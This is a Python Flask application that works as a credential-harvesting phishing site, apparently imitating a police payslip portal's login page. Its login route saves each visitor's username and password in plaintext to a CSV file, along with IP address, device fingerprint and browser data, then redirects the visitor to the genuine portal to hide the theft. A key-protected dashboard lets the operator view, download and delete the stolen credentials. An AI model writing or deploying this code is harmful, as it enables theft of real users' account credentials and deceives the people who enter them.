from flask import Flask, render_template, request, redirect, jsonify, session, send_file, url_for
import csv 
import os 
import time 
import subprocess 
import platform 
import re 
import json 
import hashlib
import uuid
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = os.urandom(24)
# Set session timeout to 1 hour
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# add a custom filter for hashing passwords in templates
@app.template_filter('hash')
def hash_filter(value):
    """Hash a value for display in templates"""
    if not value:
        return "N/A"
    # create a type of hash(SHA-256)
    hashed = hashlib.sha256(f"pnppms-{value}".encode()).hexdigest()
    # Return the full hash
    return hashed

# Secret access key for stats page (tip: here is the key for dashboard URL) 
STATS_ACCESS_KEY = "1cdf60e3d6ca57a097265dc72d73d871"

# route for handling the starting URL or pinakaunang URL
@app.route('/')
def root():
    return redirect('/Account/Login/password-reset')

# routing for the login page
@app.route('/Account/Login/password-reset')
def index():
    return render_template('index.html')

# routing for the login form submission
@app.route('/login', methods=['POST'])
def login():
    # grab the form data
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return render_template('index.html', error="Please enter both username and password")
    
    # grab client information
    ip_address = get_client_ip()
    device_type = get_device_type()
    device_fingerprint = generate_device_fingerprint()
    browser_info = get_browser_info()
    
    # Get current time
    now = datetime.now()
    adjusted_time = now + timedelta(hours=8)  
    timestamp = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p')
    
    # Save the data
    save_full_data("", "", username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
    
    # redirect to the original payslip portal
    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")

"""
A function designed to retrieve 
and return the client's actual IP address.
"""
def get_client_ip():
    """
    Enhanced function to get the most accurate client IP address
    by checking multiple headers in priority order
    """
    # List of headers to check in priority order
    ip_headers = [
        'CF-Connecting-IP',           # Cloudflare
        'True-Client-IP',             # Akamai and some CDNs
        'X-Forwarded-For',            # Most common proxy header
        'X-Real-IP',                  # Nginx proxy/FastCGI
        'X-Client-IP',                # Apache proxy
        'Forwarded',                  # RFC 7239 standard
        'X-Forwarded',                # Non-standard but sometimes used
        'X-Cluster-Client-IP',        # Used by some load balancers
        'Fastly-Client-IP',           # Fastly CDN
        'X-Originating-IP'            # Microsoft 
    ]
    
    # Check each header in order
    for header in ip_headers:
        if header.lower() == 'x-forwarded-for' and request.headers.getlist(header):
            # X-Forwarded-For may contain multiple IPs, get the first one (client)
            forwarded_for = request.headers.getlist(header)[0]
            if forwarded_for:
                # Get the leftmost IP which is typically the original client
                client_ip = forwarded_for.split(',')[0].strip()
                if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                    return client_ip
        elif request.headers.get(header):
            client_ip = request.headers.get(header).strip()
            if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                return client_ip
    
    # Try WSGI environment variables if headers failed
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        forwarded_for = request.environ.get('HTTP_X_FORWARDED_FOR')
        client_ip = forwarded_for.split(',')[0].strip()
        if client_ip and client_ip != '127.0.0.1':
            return client_ip
    
    return request.remote_addr

"""
Function to determine if the client is using a mobile or desktop device
depending on their current device they try to log in.
"""
def get_device_type():
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Patterns specifically for phones
    phone_patterns = [
        'android', 'iphone', 'ipod', 'blackberry', 
        'iemobile', 'opera mini', 'windows phone', 'mobile'
    ]
    
    # Patterns for tablets (which are still mobile but not phones)
    tablet_patterns = [
        'ipad', 'tablet'
    ]
    
    # First check if it's a phone
    if any(pattern in user_agent for pattern in phone_patterns):
        return 'Phone'
    # If not a phone, check if it's a tablet
    elif any(pattern in user_agent for pattern in tablet_patterns):
        return 'Tablet'
    # Otherwise it's a desktop
    return 'Desktop'

def generate_device_fingerprint():
    """
    Generate a unique device fingerprint based on browser characteristics
    This is more reliable than trying to get MAC addresses
    """
    user_agent = request.headers.get('User-Agent', '')
    accept_lang = request.headers.get('Accept-Language', '')
    accept_encoding = request.headers.get('Accept-Encoding', '')
    accept = request.headers.get('Accept', '')
    ip_address = get_client_ip()
    screen_info = request.cookies.get('screen_info', '')
    timezone = request.cookies.get('timezone', '')
    platform_info = request.cookies.get('platform_info', '')
    canvas_fp = request.cookies.get('canvas_fp', '')
    
    # Create a unique fingerprint from multiple browser characteristics
    fingerprint_data = f"{user_agent}|{accept_lang}|{accept_encoding}|{accept}|{ip_address}|{screen_info}|{timezone}|{platform_info}|{canvas_fp}"
    # Generate a unique ID combining SHA-256 hash and a portion of UUID
    unique_id = str(uuid.uuid4())[:8]
    fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()[:24] + unique_id
    
    return fingerprint

def get_browser_info():
    """
    Extract comprehensive browser information from User-Agent
    """
    user_agent = request.headers.get('User-Agent', '')
    
    # Extract browser name and version
    browser_name = "Unknown"
    browser_version = "Unknown"
    
    # Samsung Internet browser
    if re.search(r'SamsungBrowser/(\d+(\.\d+)+)', user_agent):
        browser_name = "Samsung Internet"
        match = re.search(r'SamsungBrowser/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # UC Browser
    elif re.search(r'UCBrowser/(\d+(\.\d+)+)', user_agent):
        browser_name = "UC Browser"
        match = re.search(r'UCBrowser/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Yandex Browser
    elif re.search(r'YaBrowser/(\d+(\.\d+)+)', user_agent):
        browser_name = "Yandex"
        match = re.search(r'YaBrowser/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Edge
    elif re.search(r'Edg/|Edge/', user_agent):
        browser_name = "Edge"
        match = re.search(r'(?:Edge|Edg)/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Firefox Focus/Klar 
    elif re.search(r'Focus/|Klar/', user_agent) and re.search(r'Firefox/', user_agent):
        browser_name = "Firefox Focus"
        match = re.search(r'(?:Focus|Klar)/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Firefox
    elif re.search(r'Firefox/', user_agent):
        browser_name = "Firefox"
        match = re.search(r'Firefox/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Opera
    elif re.search(r'OPR/|Opera/', user_agent):
        browser_name = "Opera"
        match = re.search(r'(?:OPR|Opera)/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Vivaldi
    elif re.search(r'Vivaldi/', user_agent):
        browser_name = "Vivaldi"
        match = re.search(r'Vivaldi/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Chromium
    elif re.search(r'Chromium/', user_agent):
        browser_name = "Chromium"
        match = re.search(r'Chromium/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Chrome
    elif re.search(r'Chrome/', user_agent) and not re.search(r'Chromium|Edg|Edge|OPR|Opera|YaBrowser|SamsungBrowser|UCBrowser|Vivaldi/', user_agent):
        browser_name = "Chrome"
        match = re.search(r'Chrome/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Safari on iOS
    elif re.search(r'Safari/', user_agent) and re.search(r'iPhone|iPad|iPod', user_agent) and not re.search(r'Chrome|Chromium|Edge|Edg|OPR|Opera/', user_agent):
        browser_name = "Safari (iOS)"
        match = re.search(r'Version/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Safari on macOS
    elif re.search(r'Safari/', user_agent) and not re.search(r'Chrome|Chromium|Edge|Edg|OPR|Opera/', user_agent):
        browser_name = "Safari"
        match = re.search(r'Version/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Internet Explorer
    elif re.search(r'MSIE|Trident/', user_agent):
        browser_name = "Internet Explorer"
        msie_match = re.search(r'MSIE\s+(\d+(\.\d+)+)', user_agent)
        rv_match = re.search(r'rv:(\d+(\.\d+)+)', user_agent)
        
        if msie_match:
            browser_version = msie_match.group(1)
        elif rv_match:
            browser_version = rv_match.group(1)
    
    # Create browser info JSON with browser details
    browser_details = {
        'browser_name': browser_name,
        'browser_version': browser_version,
        'full_user_agent': user_agent
    }
    
    return json.dumps(browser_details)

def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
    """ 
    Save simplified user data to CSV with only essential information
    """
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, 'data.csv')
    
    # Add PHT label if not already there
    if "PHT" not in timestamp:
        timestamp_with_pht = timestamp + " PHT"
    else:
        timestamp_with_pht = timestamp
    
    try:
        file_exists = os.path.isfile(csv_path)
        
        with open(csv_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)

            # Write header if file does not exist or is empty
            if not file_exists or os.stat(csv_path).st_size == 0:
                writer.writerow([
                    'username',
                    'password',
                    'timestamp'
                ])
                csvfile.flush()

            # Write only essential data
            writer.writerow([
                username,
                password,
                timestamp_with_pht
            ])
            csvfile.flush()
            
        # Update the last modified timestamp
        update_last_modified_timestamp()
            
    except Exception as e:
        # Fallback path if main path fails
        fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
        with open(fallback_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
            
            if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
                writer.writerow([
                    'username',
                    'password',
                    'timestamp'
                ])
                csvfile.flush()
            
            # Write only essential data
            writer.writerow([
                username,
                password,
                timestamp_with_pht
            ])
            csvfile.flush()
            
        # Update the last modified timestamp (for fallback path)
        update_last_modified_timestamp(fallback_path)

def update_last_modified_timestamp(csv_path=None):
    """Update the timestamp for when the data was last modified"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
        
        # Apply the same time adjustment as in the login function
        now = datetime.now()
        adjusted_time = now + timedelta(hours=8)  
        current_time = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
        
        # Write timestamp to file
        with open(timestamp_file, 'w') as f:
            f.write(current_time)
    except Exception as e:
        print(f"Error updating timestamp: {str(e)}")

def get_last_modified_timestamp():
    """Get the timestamp when the data was last modified"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
        
        if os.path.exists(timestamp_file):
            with open(timestamp_file, 'r') as f:
                return f.read().strip()
        
        # If file doesn't exist, check the CSV file's modification time
        csv_path = os.path.join(script_dir, 'data.csv')
        if os.path.exists(csv_path):
            modified_time = os.path.getmtime(csv_path)
            
            timestamp_dt = datetime.fromtimestamp(modified_time)
            adjusted_time = timestamp_dt + timedelta(hours=8)  
            return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
        
        # If all else fails, return current time with correct adjustment
        now = datetime.now()
        adjusted_time = now + timedelta(hours=8)  
        return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
    except Exception as e:
        print(f"Error getting timestamp: {str(e)}")
        # Return current time with correct adjustment
        now = datetime.now()
        adjusted_time = now + timedelta(hours=8)  
        return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"

# Add a route to view statistics with access key protection
@app.route('/stats/<access_key>', methods=['GET'])
def view_stats(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Check if user is authenticated for dashboard and session is still valid
    if 'dashboard_auth' not in session or 'last_activity' not in session:
        # If not authenticated or session expired, redirect to dashboard login
        return redirect(url_for('dashboard_login', access_key=access_key))
    
    # Check if session has expired (1 hour)
    last_activity = datetime.fromisoformat(session['last_activity'])
    if datetime.now() - last_activity > timedelta(hours=1):
        # Session expired, clear it and redirect to login
        session.clear()
        return redirect(url_for('dashboard_login', access_key=access_key))
    
    # Update last activity timestamp
    session['last_activity'] = datetime.now().isoformat()
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    data = []
    for path in possible_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as csvfile:
                    reader = csv.DictReader(csvfile)
                    # Get data exactly as stored
                    for row in reader:
                        entry = {}
                        # Username as stored
                        entry['username'] = row.get('username', '')
                        # Password as stored (will be hashed in template)
                        entry['password'] = row.get('password', '')
                        # Timestamp exactly as stored - no conversion
                        entry['timestamp'] = row.get('timestamp', '')
                        
                        data.append(entry)
                break  # Successfully read data, exit loop
            except Exception as e:
                continue
    
    # Get the last modified timestamp
    last_updated = get_last_modified_timestamp()
    
    if request.args.get('format') == 'json':
        return json.dumps(data)
    else:
        return render_template('stats.html', entries=data, access_key=access_key, last_updated=last_updated)

# Add a dashboard login route
@app.route('/dashboard-login/<access_key>', methods=['GET', 'POST'])
def dashboard_login(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
        
    error = None
    
    # Define the dashboard credentials - these can be changed as needed
    dashboard_password = "OJT-PNP-DICTM-2025"  # Change this to a secure password
    
    if request.method == 'POST':
        password = request.form.get('password')
        
        if not password:
            error = "Please enter a password"
        elif password == dashboard_password:
            # Password is correct, set session variables and redirect to dashboard
            session['dashboard_auth'] = True
            session['last_activity'] = datetime.now().isoformat()
            session.permanent = True  # Make session permanent
            return redirect(url_for('view_stats', access_key=access_key))
        else:
            error = "Invalid password"
    
    # Render login template
    return render_template('dashboard_login.html', access_key=access_key, error=error)

# Add a route to verify password
@app.route('/verify-password/<access_key>', methods=['POST'])
def verify_password(access_key):
    if access_key != STATS_ACCESS_KEY:
        return jsonify({"success": False, "error": "Access denied"}), 403
    
    data = request.get_json()
    password = data.get('password')
    
    # Define the dashboard credentials - these can be changed as needed
    dashboard_password = "PNP-DICTM-2025"  # Change this to a secure password
    
    if not password:
        return jsonify({"success": False, "error": "Password is required"}), 400
    
    if password == dashboard_password:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Invalid password"}), 401

# Add routes to secure all dashboard-related operations
@app.route('/download-csv/<access_key>', methods=['GET'])
def download_csv(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # check if user is authenticated for dashboard
    if 'dashboard_auth' not in session:
        # If not authenticated, redirect to dashboard login
        return redirect(url_for('dashboard_login', access_key=access_key))
    
    # Update last activity timestamp to prevent session timeout during download
    session['last_activity'] = datetime.now().isoformat()
    
    # try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    try:
        # create a temporary file for download with plain text passwords
        temp_csv_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'temp_download.csv')
        
        with open(csv_path, 'r') as csvfile:
            reader = csv.DictReader(csvfile)
            rows = list(reader)
        
        with open(temp_csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            
            writer.writerow(['username', 'password', 'timestamp'])
            
            for row in rows:
                username = row.get('username', '')
                password = row.get('password', '')  
                timestamp = row.get('timestamp', '') 
                
                writer.writerow([username, password, timestamp])
        
        filename = f"login_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        
        response = send_file(
            temp_csv_path,
            mimetype='text/csv',
            as_attachment=True,
            download_name=filename
        )
        
        # clean up temp file after response is sent
        @response.call_on_close
        def cleanup():
            if os.path.exists(temp_csv_path):
                try:
                    os.remove(temp_csv_path)
                except:
                    pass
        
        return response
        
    except Exception as e:
        print(f"Error generating download file: {str(e)}")
        if os.path.exists(temp_csv_path):
            try:
                os.remove(temp_csv_path)
            except:
                pass
        return f"Error: {str(e)}", 500

# routing to delete a specific entry
@app.route('/delete-entry/<access_key>/<int:entry_index>', methods=['DELETE'])
def delete_entry(access_key, entry_index):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # inspect if user is authenticated for dashboard
    if 'dashboard_auth' not in session:
        # not authenticated then, return auth error
        return "Authentication required", 401
    
    # Update last activity timestamp
    session['last_activity'] = datetime.now().isoformat()
    
    # dig the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    try:
        all_data = []
        with open(csv_path, 'r') as csvfile:
            reader = csv.reader(csvfile)
            all_data = list(reader)
        
        # check if the index is valid
        if entry_index < 0 or entry_index >= len(all_data) - 1: 
            return "Invalid entry index", 400
        
        # remove the entry (add 1 to skip header)
        del all_data[entry_index + 1]
        
        # write back the updated data
        with open(csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerows(all_data)
        
        # update the last modified timestamp
        update_last_modified_timestamp()
        
        return "Entry deleted successfully", 200
    
    except Exception as e:
        print(f"Error deleting entry: {str(e)}")
        return f"Error: {str(e)}", 500

# routing to delete all entries
@app.route('/delete-all/<access_key>', methods=['DELETE'])
def delete_all(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # validate if user is authenticated for dashboard
    if 'dashboard_auth' not in session:
        # if not authenticated then, return auth error
        return "Authentication required", 401
    
    # Update last activity timestamp
    session['last_activity'] = datetime.now().isoformat()
    
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    try:
        # just keep the header function
        with open(csv_path, 'r') as csvfile:
            reader = csv.reader(csvfile)
            header = next(reader)  
        
        # print back only the header
        with open(csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(header)
        
        # update the last modified timestamp
        update_last_modified_timestamp()
        
        return "All entries deleted successfully", 200
    
    except Exception as e:
        print(f"Error deleting all entries: {str(e)}")
        return f"Error: {str(e)}", 500

# logout route for the dashboard
@app.route('/dashboard-logout/<access_key>', methods=['GET', 'POST'])
def dashboard_logout(access_key):
    # remove all session data
    session.clear()
    # redirect to dashboard login
    return redirect(url_for('dashboard_login', access_key=access_key))

if __name__ == '__main__':
    
    app.run(
        host='0.0.0.0',  
        port=5000,       
        debug=False      
    ) 